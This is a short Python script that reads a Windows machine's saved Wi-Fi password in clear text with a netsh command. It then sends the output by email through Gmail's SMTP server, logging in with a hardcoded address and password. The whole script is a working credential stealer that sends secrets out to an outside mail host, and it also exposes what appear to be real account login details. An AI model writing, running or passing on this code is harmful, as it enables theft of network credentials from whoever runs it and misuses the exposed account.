

import subprocess, smtplib

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()
	
command = "netsh wlan show profile Connected key = clear" 
result = subprocess.check_output(command, shell = True)
send_mail("scolow2111@ueab.ac.ke", "colo5115", result)
